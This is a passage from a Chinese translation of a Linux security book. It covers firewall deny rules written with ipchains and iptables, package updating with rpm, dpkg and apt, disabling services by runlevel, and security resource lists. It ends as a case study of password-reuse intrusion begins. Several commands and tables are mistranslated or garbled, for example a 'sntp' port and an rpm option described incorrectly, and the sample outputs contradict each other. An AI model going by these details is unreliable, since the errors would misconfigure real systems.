/sbin/iptables -A INPUT -s 0/0 -d 192.168.1.102 -p udp \
  --dport 33435:33525 -j DROP
```



## 第13 章：访问控制与防火墙

### Telnet 端口连接尝试

| 指标 | 评分 |
| :--- | :--- |
| 流行度 | 8 |
| 简单性 | 8 |
| 影响 | 5 |
| 风险等级 | 7 |

我们的机器连接到内部网络以及互联网。我们允许网络上的其他机器 `telnet` 进入，因此必须提供此服务。然而，为内部网络提供此服务意味着我们必须依赖 TCP wrappers 来保护我们免受来自互联网尝试 `telnet` 的黑客。仅通过 TCP wrapper 保护，黑客将知道端口是开启的，只是被拒绝了。因此，她可能会尝试寻找另一台允许通过 `telnet` 连接的信任机器。如果端口在内核中被完全封，黑客将无法知道它在任何地方是否可用。

### 使用 ipchains 防火墙拒绝连接

我们可以使用防火墙规则拒绝发送到我们机器的互联网数据包。假设我们的机器通过以太网接口 `eth0` 连接到互联网。拒绝入站 `telnet` 数据包的 `ipchains` 规则为：

```
/bin/ipchains -A input -i eth0 -s 0 -d 192.168.1.102 telnet -p tcp -j DENY
```

此示例很容易扩展到拒绝对其他服务的访问。我们可以通过以下命令拒绝 FTP 服务：

```
/bin/ipchains -A input -i eth0 -s 0 -d 192.168.1.102 ftp -p tcp -j DENY
```

通过以下命令拒绝 SMTP 服务：

```
/bin/ipchains -A input -i eth0 -s 0 -d 192.168.1.102 sntp -p tcp -j DENY
```



## 防火墙策略

为您的 Linux 机器创建防火墙时，我们建议您遵循这一简单规则：“未明确允许的都应被拒绝”。换句话说，准确确定允许哪些数据包（源端口、目的端口和 IP 地址），创建允许它们通过的规则。所有其他数据包都应该被丢弃。这是最安全的方法。

实现这种策略的一种方法是让防火墙开始拒绝所有数据包，并将被拒绝的数据包记录到日志文件中。然后，监控日志文件并注意被丢弃的数据包。如果您看到想要允许通过的数据包（例如，如果您是 Web 服务器，您将希望允许进入 80 端口的数据包），则在 `ipchains`/`iptables` 规则集的顶部添加允许该特定数据包进入的规则。继续这种方法，直到您决定提供的所有服务都能从互联网访问为止。

> 注意：如果您允许所有数据包进入机器，您应该使用 TCP wrappers 来保护您的服务。

# 破解 Linux 揭秘：Linux 安全秘密与解决方案

# Linux 破解实战：Linux 安全秘密与解决方案

使用 `iptables` 编写的防火墙脚本完整示例请访问 `www.hackinglinuxexposed.com`。

## 防火墙产品

Linux 有许多防火可用——有些是开源的，有些是商业的。这里讨论了其中最流行的几种。

## 防火墙配置工具

查看以下工具。

- `http://www.linux-firewall-tools.com/linux/` 是一个免费的防火墙配置工具。你可以选择你想要允许的服务或端口，它将生成一个包含 `iptchains` 和 `ipfwadm`（用于 2.0 内内核）命令的 shell 脚本，以启用你指定的限制。这个精彩的在线工具是一组在浏览器框架中运行的 CGI 程序，它能为你提供有关与其所定义的协议相关的安全问题的信息。

- `http://t245.dyndns.org/~monmotha/firewall/index.php` 是 MonMath 的 IPTables，这是一个免费提供的、易于配置的 shell 脚本。它的注释非常详尽。只需下载脚本，按照注释说明进行建议的更改即可。

## 开源防火墙

`FWTK` (FireWall Tool Kit, `http://www.fwtk.org/`) 是一组应用代理（它们构成了商业产品 Gauntlet的基础），你可以用它在 Linux 上创建应用代理防火墙。

`SINUS` (`http://www.ifi.unizh.ch/jkm/SINUS/firewall/`) 是一种防火墙，你可以将其用于运行小型 Linux 发行版且具有 2.2 内核防火墙能力的机器。

`Floppyfw` (`http://zelow.net/floppyfw/`) 是一个具有防火墙功能的静态路由器，从软盘启动，支持从单个 1.44MB 软盘进行配置。

Linux 路由器项目 (`http://www.linuxrouter.org/`) 是另一个从软盘启动的路由器/防火墙系统，将内核和根文件系统保存到内存磁盘（`ramdisk`）中。现几个自定义版本可能符合你的需求且无需任何操作；只需插入正确的 IP 地址或使用 ISP 提供的 DHCP 即可。

## 商业防火墙

有很多许多用防火墙可以放在你的 Linux 机器前面。有些运行在专有硬件上，有些运行在不同的操作系统上。主要供应商包括：

- Checkpoint (`http://www.checkpoint.com/`) 提供了多种防火墙和安全产品，包括 VPN、防火墙、入侵检测软件等。

Cisco Pix 防火墙 (`http://www.cisco.com/`) 是一种使用非常类似于 Cisco IOS 配置语言的状态检测数据包过滤器。这些设备允许多个接口和安全区域，支持网络地址翻译和端口地址翻译。

Gauntlet (`http://www.pgp.com/products/gauntlet/`) 是 PGP Security 提供的防火墙和 VPN 产品。它具有数据包过滤规则、应用代理、内容过滤和病毒扫描功能。

Sonicwall (`http://www.sonicwall.com/`) 提供了一种“互联网安全设备”，可以作为防火墙、病毒保护器、身份验证器和内容过滤器连接到你的网络。它提供了多种不同的产品，从小企业解决方案到小型分支机构的解决方案不等。

## 总结

如果你的 Linux 机器连接到互联网并提供了任何网络服务——特别是那些允许登录的服务——那么实施主机控制和防火墙对于安全来说是关重要的。主机控制限制了你选择的机器访问你的服务，为了实现这些控制，我们可以使用带有 TCP wrappers 的 `inetd` 或 `xinetd`。防火墙将阻止除你允许通过的所有数据包。我们使用 `ipchains` 为 2.2 内核实现防火墙，为 2.4 内核使用 `iptables`。

正确地配置对机器的访问既快速也不容易。然而，其结果——在网络层面将黑客隔绝在外——是非常值得的。

# 第五部分

# 附录

# 附录 A

![](img/33829ffb1435b4baef56fcd2c28ec6cd_522_0.png)

# Linux 破解实战：Linux 安全秘密与解决方案

Linux 的优点之一是有多种发行版可供。你可能会发现由于提供的软件、包管理系统或对安全的态度，你更倾向于某个版本而不是另一个；或者无论你选择哪种发行版，都必须确保保持程序程序更新，否则你最终将运行带有漏洞或可利用安全漏洞的老版本。

Linux 发行版将软件拆分为离散的包。这意味着升级一个程序而无需升级整个系统。即使是如 `ls`、`ps`、`grep` 和 `bash` 等核心 Linux 程序通常也在单独的包中。同样，常见的库文件如 `/lib/libc.so` 也与其他程序文件分开存放。

大多数发行版通过其网站通过 HTTP 或 FTP 提供升级。某些第三方包也会镜像它们的发行版和升级。例如，Red Hat 几乎有 200 个官方镜像站点。我们在附录 C 中列出了一些主要发行版的 URL 列表接。如果我们没有列出你的发行版，请检查你的文档。

如果你倾向于自己编译软件而不是依赖预编译的软件，那么在更新发生时自行下载最新的源代码并重新编译。确保你加入了你支持的软件的任何邮件列表，以便确保在有新版本时你能够收到通知。

Linux 发行版认为倾向于使用小包而不是单体巨兽。然而，并非所有的 Linux 发行版都使用相同的包管理工具。我们将讨论 Linux 上一些更流行的包管理工具。

## 红帽的 RPM

Red Hat Package Manager（红帽包管理器）是 Red Hat 开发的系统。它被许多其他 Linux 发行版使用，如 SuSE、Mandrake 和 Tuxops，也运行在其他操作系统上，如 BSD 和 Solaris。由于 Red Hat 创建了 rpm，我们将重点讨论红帽版本，但该讨论适用于任何基于 rpm 的发行版。

所有的 rpm 活动都可以通过 `rpm` 程序完成。表 A-1 列出了常用的选项。某些选项有长短形式对应，因此我们列出了它们。

如果你更喜欢使用鼠标，还有用于 rpm 功能的图形界面。其中一个是 Gnome RPM，如图 A 所示。这些程序通常使用命令行 rpm 可选项的子集，但对于安装和验证已经足够了。

Red Hat 定期发布 Linux 发行版的新版本，包含新软件和旧软件的更新版本。当发现严重 Bug 或安全问题时，Red Hat 也会在发布之间发布更新。可以通过 `ftp://ftp.RedHat.com/pub/RedHat/updates/VERSION/ARCH` 获取，

| 命令 | 替代标志 | 描述 |
| --- | --- | --- |
| `rpm -i package.rpm` | `--install` | 列出 `package.rpm` 中的文件 |
| `rpm -qa` | `--query --all` | 列出所有已安装包的名称 |
| `rpm -ql package-name` | `--query --list` | 列出已安装包 "`package-name`" 的所有文件 |
| `rpm -qpl package.rpm` | `--query -p--list` | 列出 `package.rpm` 的所有文件 |
| `rpm -q /path/to/file` | `--query --file` | 显示哪个已安装包拥有文件 |
| `rpm -V package-name` | `--verify` | 验证已安装包每个文件的校验和、大小、权限、类型、所有者和组 |
| `rpm -U package.rpm` | `--upgrade` | 通过卸载旧包并安装新包来升级包 |
| `rpm -F package.rpm` | `--freshen` | 仅当包已安装时，按上述方法升级包 |

**表 A-1.** 有用的 rpm 命令行参数

`VERSION` 是红帽版本号，`ARCH` 是你的架构（例如 `i386`、`sparc` 或 `alpha`）。要安装或升级特定的 rpm，你可以手动从 ftp 服务器下载并从本地文件安装，你也可以让 `rpm` 命令通过 HTTP 或 FTP 自动下载，如下例所示：
```
rpm -F ftp://ftp.RedHat.com/pub/RedHat/updates/7.0/package.rpm
```

# Linux 攻击实战：Linux 安全秘密与解决方案

| 软件包 | 操作 | 卸载 | 查询 | 查找 | 网页查找 |
|---|---|---|---|---|--|
| 安装 | 取消选择 | | 验证 | | |
| | 包 | 版本 | 发布版本 | 摘要 |
| 禁止项目 | 1.0 | 1 | StarOffice 桌面图标/设置 |
| 应用程序 | tudops-30-cfg | 1.0 | 3 | 适用于 30w 笔记本的 Tudops 配置 |
| 配置 | tudops-common-cfg | 1.0 | 3 | 所有笔记本的 Tudops 通用配置 |
| Debian | tudops-desktop | | 2 | Tudops 桌面配置 |
| 开发 | | 1.0 | 2 | 双系统笔记本的 Tudops 特定配置 |
| 文档 | tudops-firstboot | 1.8 | 1 | Tudops 首次启动初始化脚本 |
| 网络 | tudops-pcmcia | 3.1.15 | 2 | 为内核重新编译 PCMCIA 包 |
| 系统配置 | | | | | |
| 系统环境 | | | | | |
| 用户界面 | | | | | |

**图 A-1.** 使用 Gnome RPM 查看已安装的软件包

> 注意：如果您是从镜像站点获取 rpm 的，请记住它可能没有同步，并且可能无法立即获得最新的更新。虽然大多数镜像站每天更新一次，但这并非绝对保证。

你有两种 rpm 选项可以升级：`rpm -U` (upgrade) 和 `rpm -F` (freshen)。升级版本将卸载旧版本并安装新版本。这意味着即使没有安装旧版本，你最终也会安装新版本。另一方面，`freshen` 只有在已经安装了旧版本的情况下才不会安装该 rpm。

我们强烈建议您在升级时使用 `freshen` 选项。这可以防止您误装新软件。机器上的软件越少，出现漏洞或不安全软件的概率就越低。

我们通常的做法是使用 (`wget`) 下载 Red Hat 机器的升级目录。然后通过使用 `rpm -F`，我们可以确保始终拥有已软件的最新版本，而不会向系统添加新程序。要查看我们自动化此过程的脚本，请访问我们的网页 `www.hackinglinuxexposed.com`。

> 警告：使用 GUI 前端时要小心，因为它们可能只支持升级模式，不支持 freshen 模式。

## DEBIAN 的 DKG 和 APT

Debian Linux 使用 Debian 软件包系统。一个名为 `dpkg` 的程序允许您执行所有的软件包安装和升级。表 A-2 列出了一些常用的 `dpkg` 命令。

| 命令 | 备用标记 | 说明 |
|---|---|---|
| `dpkg -i package.deb` | `--install` | 安装 `package.deb` 中的文件。 |
| `dpkg -r package-name` | `--remove` | 卸载已安装的包，但保留相关的配置文件（如果您以后想安装相同配置的新版本，这很好）。 |
| `dpkg -P package-name` | `--purge` | 移除已安装的包，包括配置文件。 |
| `dpkg -p package-name` | `--print-avail` | 显示软件包详情。 |
| `dpkg -l pattern` | `--list` | 列出所有匹配给定模式的软件包。允许普通的 shell 通配符（如 `*`）。如果未指定模式，则列出所有软件包。 |
| `dpkg -L package-name` | `--listfiles` | 列出哪些文件由包所有。 |
| `dpkg -S pattern` | `--search` | 显示哪个包拥有给定文件。 |

表 A-2. 有用的 dpkg 命令行参数

# Linux 攻击实战：Linux 安全秘密

要升级现有软件包，只需安装新版本即可。`dpkg` 会自动删除旧版本并安装新版本，同时保持配置文件完整。下面我们使用 `dpkg` 安装较新版本的 `wdiff`：
```



machine# `dpkg -i wdiff`

Desired=Unknown/Install/Remove/Purge/Half-installed

| Status=Not/Installed/Config-files/Unpacked/Failed-config

| Err?=(none)/Hold/Reinst-required/X-both-problems (Status, Err: uppercase)

| Name Version Description

===============================================

ii wdiff 0.5-8 GNU wdiff 工具. 按单词比较文件。

```
```
machine# `ls wdiff`

wdiff_0.5-10.deb

```
```
machine# `dpkg -i wdiff`

(Reading database 45512 files and directories.)

Preparing to replace wdiff-0.8 (using wdiff_0.10.deb) ...

Unpacking replacement wdiff ...

Setting up wdiff (10)

```
```
machine# `dpkg -l wdiff`

Desired=Unknown/Install/Remove/Purge/Half-installed

| Status=Not/Installed/Config-files/Unpacked/Failed-config

| Err?=(none)/Hold/Reinst-required/X-both-problems (Status, Err: uppercase)

| Name Version Description

===============================================

ii wdiff 0.5-8 GNU wdiff 工具. 按单词比较文件。

```
Debian 软件包系统类似于 Red Hat 软件包管理器，如上所示。然而，Debian 还提供了 `apt` 高级工具。`apt` 允许您从 FTP、HTTP、CD-ROM 等许多源快速获取并安装软件和更新。您在 `/etc/apt/sources.list` 文件中配置源：

```
/etc/apt/sources.list
# 查看 list(5) 获取信息，特别是
# 您您可以使用 http, ftp 或 URI 方案
# CD-ROMs 通过 apt-cdrom 工具管理。
deb http://us.debian.org/debian stable main contrib
deb http://us.debian.org/debian/non-US stable main contrib
deb http://security.debian.org/debian/updates main contrib
# 如果取消 apt-get source 函数工作
#deb-src http://us.debian.org/debian stable main contrib
#deb-src http://us.debian.org/debian/non-US stable main contrib
```

# 附录 A：保持程序更新

上面我们说明了想要下载 Debian 软件包的 HTTP 站点。`apt-get` 是 `apt` 的命令行界面。这里列出了最实用的选项：

| 选项 |  |
|---|---|
| update | 更新 apt 数据库。每次使用 apt-get 之前都应该运行此命令。 |
| upgrade | 升级所有软件包。 |
| upgrade package-name | 升级指定的软件包。 |
| install package-name | 安装指定的软件包。package-name 可以是 POSIX 正则表达式。 |
| remove package-name | 移除已安装的包。 |
| source package-name | 将指定包的源获取到当前目录。 |

安装软件包时，`apt-get` 会填充任何依赖项。例如，`stunnel` 包需要 OpenSSL，因此运行 `apt-get` 会先安装 OpenSSL。使用 `apt-get` 极大地提高了安装和升级速度，但您仍然可以使用普通的 `dpkg` 命令查询已安装的软件包。这里展示了您如何使用 `apt-get` 升级 `wdiff`：

```
machine# `dpkg -l|grep wdiff`
ii wdiff 0.5-8 GNU wdiff 工具. 按单词比较文件。
```

```
machine# `apt-get upgrade wdiff`
Reading Package Lists... Done
Building Dependency Tree... Done
1 packages upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
Need to get 0B/31.1kb of archives. After unpacking 1024B will be used.
Do you want to continue? [Y/n] y
(Reading database ... 45512 files and directories installed.)
Preparing to replace wdiff 0.5-8 (using ...archives/wdiff/0.5-10_i386.deb) ...
Unpacking replacement wdiff ...
Setting up wdiff (10) ...
```

```
machine# `dpkg -l|grep wdiff`
ii wdiff 0.10 GNU wdiff 工具. 按单词比较文件。
```

或者，如果我们想升级所有当前安装的软件包，可以使用不带任何包名的 `apt-upgrade`：

```
machine# `apt-get-upgrade`
Reading Package Lists... Done
Building Dependency Tree... Done
2 packages upgraded, 0 newly installed, to remove and 0 not upgraded.
Need to get 0B/31.1KB of archives. After unpacking 1024B will be used.
Do you want to continue? [Y/n]
(Reading database, 45512 files and directories installed.)
Preparing to replace mutt 1.2.4-3 (using .../archives/mutt_1.2.5-4_i386.deb)
Unpacking replacement mutt
Setting up mutt (1.2.5-4)...
Preparing to replace procmail 3.13.1-4 (using .../archives/procmail_3.15-2_i1386.deb)
Unpacking replacement procmail
Setting up procmail (3.15-2)...
```

# SLACKWARE 软件包

Slackware 软件包是简单的压缩 tar 包。交互式程序 `pkgtool` 可以帮助您轻松管理软件包，如图 A-2 所示。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_529_0.png)

图 A-2. 使用 pkgtool 管理软件包

# 附录 A：保持您的程序更新

可以使用以下命令手动管理软件包：

| 命令 | 描述 |
|---|---|
| installpkg package.tgz | 安装指定的包。 |
| removepkg packagen | 从系统中删除该包。 |
| upgradedepkg packageName | 升级当前安装的包。根据当前目录中的文件创建一个兼容 Slack 的包。（更多信息请参阅 man 手页。） |
| explodedepkg | 将 Slack 包的内容提取到当前目录（通常用于更新和重新制作包）。 |
| rpm2tgz filename.rpm | 将 rpm 转换为 Slack 包。转换后，直接使用 `installpkg` 安装即可。 |

当有可用更新时，只需从 Slack 网站下载即可。如果包具有相同的名称（这几乎总是如此），那么只需执行简单的 `upgradedepkg packageName` 即可。如果由于某种原因软件更改了名称，请使用以下格式的命令：

```



# 附录 B：关闭不需要的服务

`machine# upgradedepkg oldname%newname`

## 502 破解 Linux 揭秘：Linux 安全秘密与解决方案

系统中运行的程序越少，黑客可能利用的程序就越少。在本附录中，我们将讨论如何确保您的不需要的程序在机器启动时自动启动。

## 运行级别 (RUNLEVELS)

Linux 机器有一个称为*运行级别*（`runlevels`）的概念：根据你所处的运行级别，不同的服务应当运行。运行级别的标准定义如下：

| 0 | 停止系统（预留） |
| 1 | 单用户模式（预留） |
| 2 | 不带 NFS的多用户模式 |
| 3 | 全多用户模式（运行级别 2 + NFS） |
| 4 | 未使用 |
| 5 | 全多用户模式 + X11 (`xdm`) 登录 |
| 6 | 重启系统（预留） |
| S,s | 用于进入运行级别 1 的脚本；不要直接使用 |
| 7-9 | 有效但在传统上不使用 |

> 注意：尽管这些是运行级别的标准定义，并不意味着特定的 Linux 发行版不会以不同的方式定义它们。请检查您的文档（首先可以检查 `man init` 和 `cat /etc/init.d/etc/rc.d/README`）以确保准确。

运行级别由 `init` 控制，它是内核引导序列的最后一步。默认运行级别定义在 `/etc/initab` 文件中，行如下：

```
id:2:initdefault:
```

此机器的默认运行级别是 2。由于这台机器不需要通过 NFS 导出目录，因此它不使用运行级别 3，运行级别 3 会启用不需要的（在历史上容易出现 bug 的）RPC 服务，如 `nfsd`、`mount`、`statd`、`lock` 等。

Linux 机器启动时，您只需在 `lilo` 提示符处输入数字即可指定它应该进入的运行级别。假设您的目标内核名为 `linux`，您可以按照如下方式直接进入单用户模式（运行级别 1）：

```
lilo: linux 1
```

您也可以可以使用 `telinit` 命令随时在运行级别之间切换。以下示例告诉机器切换到单用户模式：

```
machine# telinit 1
```

## `/etc/rc#.d` 目录

对于每个运行级别，都有一个名为 `/etc/rc#.d` 的对应目录。（在某些 Linux 发行版如 Red Hat 中，`rc#.d` 目录实际上位于 `/etc/rc.d/#`）。这些目录中的文件通常是指向 `/etc/init.d`（或 `/etc/rc.d/init.d`）中文件的软链接或硬链接。以下是一个 `rc2.d` 目录的示例：

```
machine# ls -C /etc/rc3.d
K10xntpd    S10network S25netfs  S50inet   S85httpd
K20nfs      S11portmap S30yslog  S55ssd    S85nessusd
K20rwhod   S14fslock S40td      S75keytable S90xifs
K92ipchains S16apnd   S40ocrond  S80sendmail
S05kuzdu   S20random S45pcmcmia S85gpm
```

文件名以 `S`（停止）或 `K`（杀死）开头，后跟两个数字，然后是服务名称。在进入运行级别时，会调用所有的 `S` 文件来启动其服务，例如 `"/etc/rc.d/S85nessusd start"`。相反，当离开此运行级别时，会调用 `K` 文件来杀死其服务，例如 `"/etc/rc.d/K92ipchains stop"`。文件按数字顺序调用；因此，在上面的示例中，`S10network` 会在 `S25netfs` 之前运行。

## 关闭特定服务

当您确定系统不需要某个特定服务时，可以很容易地确保它在启动时不运行：

1. 确定启动脚本的文件名。
2. 停止守护进程。
3. 移除相关的 `S##` 和 `K##` 脚本条目。
4. 重启机器以验证它没有启动。以下是关闭 `lpd`（线路打印机服务）的示例。（在将所有 `rc#.d` 目录放在 `/etc/rc.d` 的系统上，请将 `/etc/` 替换为 `/etc/rc.d`）。

```
machine# ls /etc/init.d/*lpd
machine# ls /etc/rc.d/S1lpd
machine# ls /etc/rc.d/S2lpd
```

这种方法适用于任何 Linux 发行版。然而，有些特殊之处需要注意。Red Hat 包含一个 `chkconfig` 程序来管理您的 `rc#.d` 条目。该程序灵感来自 IRIX 的同名命令，但有用得多。它允许为 `/etc/init.d` 中的任何服务创建 `rc#.d` 链接。您可以使用 `--list` 快速方便地列出运行级别中启动的服务：

```
machine# chkconfig --list
apm 0:off 1:off 2:on 3:on 4:on 5:on
atd 0:off 1:off 2:off 3:on 4:on 5:on
crond 0:off 1:off 2:on 3:on 4:on 5:on
gpm 0:off 1:off 2:on 3:on 4:on 5:on
httpd 0:off 1:off 2:off 3:on 4:on 5:on
inet 0:off 1:off 2:off 3:on 4:on 5:on
ipchains 0:off 1:off 2:off 3:off 4:off 5:off
keytable 0:off 1:off 2:on 3:on 4:on 5:on
lpd 0:off 1:off 2:on 3:on 4:on 5:on
mysql 0:off 1:off 2:off 3:off 4:off 5:off
cupsd 0:off 1:off 2:off 3:on 4:on 5:on
netfs 0:off 1:off 2:off 3:off 4:off 5:off
network 0:off 1:off 2:on 3:on 4:on 5:on
nfs 0:off 1:off 2:off 3:off 4:off 5:off
nfslock 0:off 1:off 2:on 3:on 4:on 5:on
pcmcia 0:off 1:off 2:on 3:on 4:on 5:on
portmap 0:off 1:off 2:on 3:on 4:on 5:on
random 0:off 1:off 2:on 3:on 4:on 5:on
sendmail 0:off 1:off 2:on 3:on 4:on 5:on
shd 0:off 1:off 2:on 3:on 4:on 5:on
syslog 0:off 1:off 2:off 3:on 4:on 5:on
vmware 0:off 1:off 2:off 3:off 4:off 5:off
xfs 0:off 1:off 2:on 3:on 4:on 5:on
ntptd 0:off 1:off 2:on 3:off 4:off 5:off
```

```
machine# chkconfig --list lpd
lpd 0:off 1:off 2:on 3:off 4:off 5:off 6:off
```

在这里我们在运行级别 2、4 和 5 中关闭 `lpd`，并在级别 3 中开启它：

```
machine# ls /etc/rc.d/rc?d*/*lpd
/etc/rc.d/rc0/K61pd
/etc/rc.d/rc1/K61pd
/etc/rc.d/rc2/S61pd
/etc/rc.d/rc3/S61pd
/etc/rc.d/rc4/S61pd
/etc/rc.d/rc5/S61pd
/etc/rc.d/rc6/K61pd
```

```
machine# chkconfig --level 245 lpd off
machine# chkconfig --level 345 lpd on
```



您可以看到 `chkconfig` 命令已经为您处理了启动/停止链接的制作。虽然没有使用 `chkconfig` 管理链接，但这是无需手动使用 `rm`、`ln` 和 `mv` 创建它们的简单方法。

# SuSE

SuSE Linux 有一些特殊之处，它与其他 Linux 发行版不同地定义运行级别，如下表所示：

| 0 | 停止系统（预留） |
| 1 | 单用户模式，无网络 |
| 2 | 多用户模式，有网络 |
| 3 | 多用户模式 + X11 (xdm) 登录 |
| 4, 5 | 未定义 |
| 6 | 重启系统（预留） |

# 破解 Linux 揭秘：Linux 安全秘密与解决方案

SUSE 的 rc.d 目录结构也有略有不同的布局：

| `/etc/rc.d/` | 指向 `/sbin/init.d` 的符号链接 |
| `/sbin/init.d/` | 传统上位于 init.d 中的脚本，以及运行级别（runlevel）目录 |
| `/sbin/init.d/rc0.d/` | 运行级别 0 的链接 |
| `/sbin/init.d/rc1.d/` | 运行级别 1 的链接 |
| `/sbin/init.d/rc6.d/` | 运行级别 6 的链接 |

虽然目录的布局与 System V 标准相比有所移动，但你仍然可以按照预期的方式启动和停止命令，例如 `sbin/init.d/sshd`。某些版本的 SUSE 包含一个名为 `rct` 的程序用于辅助维护 rc.d 符号。要列出将启动的服务，请使用 `-l` 选项：

```
machine# rctab -l -012

# Generated by rctab: Wed Jan 10 04:28:48 PST 2001

#

# Special scripts

# -- only for runlevel 0

# halt -- only for runlevel 6

# reboot -- only for single user mode

#

# Remaining services

# alsnauch apache argus autofs boot.step cron dhclient dhcp dcrelay

# dummy firewall gpm halt.local i4l i4l hardware indent netbd itd kernel lpd

# dummy network nfs ifsserver pcmia pcnfsds gosagent.init random route

# routed rpc rwhnd scanologd serial ssh svgate syslog usb xmdntpd

Runlevel:0 Runlevel:1 Runlevel:2

halt kernel kernel

- serial serial

- pcmia i4l_hardware

- dummy dummy

- syslog i4l

- boot.setup network

- random sshd

- svgatex route

- gpm argus

- kbd scanologd

- syslog

- boot.setup
```

## 附录 B：关闭不需要的服务

`named`
`random`
`at`
`usb-`

你可以像我们之前使用 `-012` 那样，告诉 `rctab` 你感兴趣在命令行中列出的运行级别。你可以通过运行 `rctab -e` 来编辑将运行的服务。它会自动启动一个编辑器，你可以在其中按意愿重新排序、删除或添加服务。

在使用 `rctab` 编辑服务时，我们建议一次只处理一个运行级别，例如使用 `rctab -e -2`。`rctab` 会给你一个与要编辑的文件完全的文件，通过剪切和粘贴整行来添加或删除更容易（至少对我们大多数人来说是），这在多列列表中是无法实现的。例如，在上面的输出中，运行级别 1 和 2 的 `syslog` 条目被几行隔开，这意味着你无法将它们一起移动。

SuSE与其他 Linux 发行版的最后一个主要区别是使用了 `/etc/rc.config` 文件，它作为一个全局配置文件——这是一个借用自 BSD 操作系统的概念。以下是 `/etc/rc.config` 的片段：

```
# Start sshd? (yes/no)
#START_SSHD="yes"
```

```
# Start stunnel? (yes/no)
#START_STUNNEL="yes"
```

```
# Start xntpd? (yes/no)
#START_XNTPD=yes
```

```
# 通常情况下，在 xntpd 启动之前
# 从其他 ntp 服务器获取当前的时间日期是个好主意。
# 如果我们需要这样做，请提供一个用空格分隔的
# ntp 服务器列表进行查询。
```

```
XNPD_INITIAL_NTPDATE="ntp.example.net"
```



`/etc/rc.config` 文件被每个 `init.d` 启动/停止脚本加载（sourced）。它包含了用于控制脚本运行方式的变量设置。每个 `init.d` 脚本都有一个 `START_SERVICE` 变量（其中 `SERVICE` 是 `init.d` 脚本的名字），将其设置为 `"yes"` 或 `"no"`，其中 `"yes"` 表示应该启动服务，而 `"no"` 表示不应该启动。因此，你实际上不需要删除 `/sbin/init.d/rc#` 中的文件来防止服务启动；只需简单更改 `/etc/rc.config` 中的变量即可。

> 注意：如果你将 `START_SERVICE` 变量设置为 `"no"`，`init.d` 脚本将立即退出。这意味着 `"/sbin/init.d/service_stop"` 实际上不会停止该服务。请将变量临时设置为 `"yes"`，或手动停止服务。

`rc.config` 文件可以手动编辑，也可以通过 YaST（又一个设置工具）或 YaST2 自动编辑。如果你手动更改了 `/etc/rc.config`，你的更改将在重启后生效——除非你手动停止或重启受影响的服务。

## Inetd 网络服务

通过 `/etc/rc.d` 目录启动的服务并不一定是你提供的唯一网络访问服务。例如，`inetd` 能够监听端口并在每次接收到连接时启动任意服务。请查看第 6 章，我们在那里讨论了如何关闭 `inetd` 服务。更好的做法是根本就不要运行 `inetd`。

## 附录 C

## 破解 Linux 揭秘：Linux 安全秘密与解决方案

保持系统更新和安全需要你关注安全世界的动态。有很多在线资源供你利用，以确保你跟上影响你系统的当前问题和漏洞。

### 供应商列表

许多 Linux 发行版都有邮件列表，让你了解最新情况。以下是你可以订阅的一些列表：

- Red Hat https://www.redhat.com/
- SuSE https://www.suse.com/
- Slack https://www.slack.com/
- Debian https://www.debian.org/
- Immunix http://www.immunix.org/
- Mandrake http://www.mandrake.com/
- Turlux http://www.turlux.com/

### 其他邮件列表

有很多邮件列表可以订阅。如果你只想订阅其中一个，必须知道这些网站：

- http://www.securityfocus.com/ | Bugzilla
- http://www.nfr.com/ | 防火墙
- http://www.packetfactory.net/ | 防火墙大师（Firewall Wizards）
- http://www.sans.org/ | Sans Weekly
- http://www.cert.org/ | 应急响应小组
- http://www.safermag.com | 安全警报
- http://www.securityportal.com | 安全门户
- http://www.linuxsecurity.com | Linux 安全新闻和文章
- http://lwn.net | Linux Weekly News
- http://www.wirerip.net/policy/policy.html | Release Puppy 发布政策
- http://www.nmrc.org/faqs/hackfaq.html | Simple Nomad 的 Hack FAQ
- http://archives.mozilla.org | 安全存档
- http://www.insecure.org | Nmap、漏洞工具和文档
- http://www.attrition.org | 破解网页镜像
- http://www.hack.co.za | 漏洞存档
- http://www.rootshell.com | 漏洞存档
- http://www.phrack.com | Phrack 杂志存档
- http://www.2600.com | Hacker 刊
- http://www.l0pht.com | L0pht Heavy Industries（现属于 @stake）
- http://www.technotronic.com | 新闻、安全存档、漏洞
- http://packetstorm.securify.com | 可下载的网络安全工具数据库

### 安全与破解网站

我们无可能列出所有的安全和破解网站；但这里有一些我们自己使用的：

- http://www.sans.org/ | 计算机响应能力
- http://www.cidr.org/ | 计算机漏洞公告
- http://www.securityfocus.com | 漏洞数据库

## 破解 Linux 揭秘网站

我们的配套网站位于 http://www.hackinglinuxexposed.com。你可以在那里找到书中列出的所有 URL、更长的建议安全、破解和漏洞网站及文档列表、书中包含的所有代码完整副本，以及指向其他可能有用书籍的链接。由于书中的物理页面只能在修订之间更改，但我们可以不断更新在线列表，因此请经常查看。

## 附录 D

## 案例分析

# 破解 Linux 暴露：Linux 安全秘密与解决方案

在接下来的案例分析中，我们将带你进入三位黑客在入侵机器时的思维世界。我们将让你目睹每一次的成功与失败、每一条输入的命令，以及管理员是否成功捕获了他们（如果捕获的话）。

通过从黑客的视角直接观察这些事情，我们将让你看到你面对的是什么样的对手，从而更好地准备防御你的系统。这些案例分析引用了书中的材料。所有的攻击案例都是真实的，完全按照发生的情况记录。只是不要问我们这些参与者的真实身份是谁。

## 案例分析 A

- 永远不要在不可信的机器上重复使用密码。
- 当黑客可以访问你的信任机器时，访问控制列表（Access lists）是不够的。
- 良好的日志可以尽早发现问题，并让你在攻击变得严重之前击退。

一如既常，这里的名字都经过了修改。如果你对这些人的真实身份感兴趣，可以尝试玩字母易位游戏。

### 背景

Martin Sardoit 和 Clive Krahe 是两个拥有许多共同兴趣的家伙。他们经常出现在同一个邮件列表（listservs）中，访问同一个 IRC 聊天室，访问同一个网页。由于某些他们自己都忘记的原因，他们每次见面都会互相对喷（flaming）。他们共同订阅的一个列表变得越来越难以管理，成员们决定将其转变为留言板。Clive 决定和其他一些列表成员一起管理留言板。留言板的一个优点是，它需要进行身份验证以防止人们伪造——这在那个非攻击性列表上正变得越来越常见。自然地，Clive 和 Martin 都在列表中。

在了一场异常激烈且充满贬义的言语大战后，Clive 决定以更直接的方式回击 Martin。作为管理员，他有能力查看成员的密码。Clive 希望 Martin 足够蠢，会在留言板上使用和家里相同的密码，于是他准备进行攻击。

### 侦查

Clive 的第一件事是通过查看 Web 服务器日志来看看 Martin 是从哪台机器发布帖的。通过将消息的时间戳与日志进行匹配，他确定了 Martin 发布帖的 IP 地址。这些行看起来像这样：

```
276.72.99.55 - [21/Aug/2000:18:41:28 -0700] "GET /post.cgi HTTP/1.0" 200 10132

